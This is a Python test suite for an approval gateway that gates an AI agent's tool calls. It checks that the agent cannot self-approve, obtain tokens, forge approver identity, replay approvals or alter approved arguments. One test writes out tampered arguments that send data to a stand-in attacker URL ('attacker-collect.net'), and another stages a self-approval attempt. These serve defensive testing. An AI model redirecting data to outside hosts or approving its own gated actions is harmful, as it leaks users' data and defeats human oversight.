"""The agent must not be able to approve its own requests (0.2.8)."""

import json
import unittest
from unittest import mock

from tests._helpers import (  # noqa: F401  (import first: sets env)
    AGENT, ALICE, BOB, approval_args, audit_events, call, client, new_session, random_value, re_, settings,
)


def _pending(sid=None, args=None):
    sid = sid or new_session()
    args = args or approval_args()
    res = call(sid, "http_post", args)
    assert res["decision"] == "REQUIRE_APPROVAL", res
    return sid, args, res


class AgentNeverGetsASecret(unittest.TestCase):
    def test_response_has_approval_id_but_no_token(self):
        _, _, res = _pending()
        self.assertTrue(res.get("approval_id"))
        self.assertNotIn("approval_token", res)
        self.assertNotIn("token", json.dumps(res).lower())

    def test_webhook_payload_has_no_token(self):
        sent = {}

        def fake_post(url, json=None, timeout=None, **kw):
            sent["payload"] = json
            return mock.Mock(status_code=200)

        with mock.patch.object(settings, "approval_webhook", "https://hooks.example.com/approve"), \
                mock.patch.object(re_.requests, "post", fake_post):
            _pending()
        self.assertIn("approval_id", sent["payload"])
        self.assertNotIn("approval_token", sent["payload"])
        self.assertNotIn("token", json.dumps(sent["payload"]).lower().replace("decide_via", ""))


class OnlyApproversDecide(unittest.TestCase):
    def setUp(self):
        self.c = client()

    def decide(self, aid, headers, **extra):
        body = {"approval_id": aid, "decision": "approve"}
        body.update(extra)
        return self.c.post("/approval/decide", json=body, headers=headers)

    def test_agent_api_key_cannot_decide(self):
        _, _, res = _pending()
        r = self.decide(res["approval_id"], AGENT)
        self.assertEqual(r.status_code, 401)
        self.assertEqual(re_.approval_queue.get(res["approval_id"]).status, "pending")

    def test_no_credentials_cannot_decide(self):
        _, _, res = _pending()
        self.assertEqual(self.decide(res["approval_id"], {}).status_code, 401)

    def test_wrong_approver_key_cannot_decide(self):
        _, _, res = _pending()
        self.assertEqual(self.decide(res["approval_id"], {"X-Approver-Key": random_value()}).status_code, 401)

    def test_decided_by_is_the_authenticated_identity_not_client_supplied(self):
        _, _, res = _pending()
        r = self.decide(res["approval_id"], BOB, decided_by="ceo", token=random_value())
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["status"], "approved")
        self.assertEqual(r.json()["decided_by"], "bob")
        events = [e for e in audit_events() if str(e["decision"]).startswith("APPROVAL_")]
        self.assertTrue(any("by bob" in " ".join(e["reasons"]) for e in events))
        self.assertFalse(any("ceo" in " ".join(e["reasons"]) for e in events))

    def test_approver_key_equal_to_agent_key_is_ignored(self):
        _, _, res = _pending()
        with mock.patch.object(settings, "approver_keys", {"agent": settings.api_key}):
            r = self.decide(res["approval_id"], AGENT)
        self.assertEqual(r.status_code, 503)
        self.assertEqual(re_.approval_queue.get(res["approval_id"]).status, "pending")

    def test_no_approver_configured_disables_approvals(self):
        _, _, res = _pending()
        with mock.patch.object(settings, "approver_keys", {}):
            r = self.decide(res["approval_id"], ALICE)
        self.assertEqual(r.status_code, 503)

    def test_agent_cannot_list_pending_but_approver_can(self):
        _, _, res = _pending()
        self.assertEqual(self.c.get("/approvals/pending", headers=AGENT).status_code, 401)
        r = self.c.get("/approvals/pending", headers=ALICE)
        self.assertEqual(r.status_code, 200)
        self.assertIn(res["approval_id"], [p["approval_id"] for p in r.json()["pending"]])

    def test_agent_can_poll_status_but_sees_only_the_outcome(self):
        _, _, res = _pending()
        r = self.c.get(f"/approval/{res['approval_id']}", headers=AGENT)
        self.assertEqual(r.status_code, 200)
        self.assertEqual(set(r.json()), {"approval_id", "status", "expires_at", "decided_at", "delivery_status"})
        full = self.c.get(f"/approval/{res['approval_id']}", headers=ALICE).json()
        self.assertIn("arguments", full)


class ResumeFlow(unittest.TestCase):
    def setUp(self):
        self.c = client()

    def approve(self, aid):
        return self.c.post("/approval/decide", json={"approval_id": aid, "decision": "approve"}, headers=ALICE)

    def test_pending_then_approved_resume_is_single_use(self):
        sid, args, res = _pending()
        aid = res["approval_id"]
        again = call(sid, "http_post", args, approval_id=aid)
        self.assertEqual(again["decision"], "REQUIRE_APPROVAL")  # not decided yet
        self.assertEqual(again["approval_id"], aid)               # same item, no duplicate queued
        self.assertEqual(self.approve(aid).status_code, 200)
        ok = call(sid, "http_post", args, approval_id=aid)
        self.assertEqual(ok["decision"], "ALLOW")
        replay = call(sid, "http_post", args, approval_id=aid)
        self.assertEqual(replay["decision"], "BLOCK")

    def test_agent_self_approval_attempt_then_resume_stays_blocked(self):
        sid, args, res = _pending()
        aid = res["approval_id"]
        r = self.c.post("/approval/decide", json={"approval_id": aid, "decision": "approve"}, headers=AGENT)
        self.assertEqual(r.status_code, 401)
        self.assertNotEqual(call(sid, "http_post", args, approval_id=aid)["decision"], "ALLOW")

    def test_tampered_arguments_after_approval_are_blocked(self):
        sid, args, res = _pending()
        self.approve(res["approval_id"])
        evil = {"url": "http://attacker-collect.net/x", "data": args["data"]}
        self.assertEqual(call(sid, "http_post", evil, approval_id=res["approval_id"])["decision"], "BLOCK")

    def test_other_session_cannot_use_the_approval(self):
        sid, args, res = _pending()
        self.approve(res["approval_id"])
        other = new_session()
        self.assertEqual(call(other, "http_post", args, approval_id=res["approval_id"])["decision"], "BLOCK")

    def test_legacy_approval_token_field_is_ignored(self):
        sid, args, res = _pending()
        self.approve(res["approval_id"])
        out = call(sid, "http_post", args, approval_id=res["approval_id"], approval_token=random_value())
        self.assertEqual(out["decision"], "ALLOW")


class DeliveryEndpoint(unittest.TestCase):
    def setUp(self):
        self.c = client()

    def test_delivery_lifecycle(self):
        sid, args, res = _pending()
        aid = res["approval_id"]
        post = lambda body, h=AGENT: self.c.post("/approval/delivery", json=body, headers=h)  # noqa: E731
        self.assertEqual(post({"approval_id": "nope", "status": "delivered"}).status_code, 404)
        self.assertEqual(post({"approval_id": aid, "status": "delivered"}).status_code, 409)  # not consumed yet
        self.assertEqual(post({"approval_id": aid, "status": "delivered"}, {}).status_code, 401)
        self.c.post("/approval/decide", json={"approval_id": aid, "decision": "approve"}, headers=ALICE)
        self.assertEqual(call(sid, "http_post", args, approval_id=aid)["decision"], "ALLOW")
        self.assertEqual(post({"approval_id": aid, "status": "bogus"}).status_code, 422)
        held = call(sid, "http_post", args)
        self.assertEqual(held["decision"], "BLOCK")  # delivery unresolved: same call is held
        self.assertEqual(post({"approval_id": aid, "status": "delivered"}).status_code, 200)
        self.assertNotEqual(call(sid, "http_post", args)["decision"], "BLOCK")


if __name__ == "__main__":
    unittest.main()
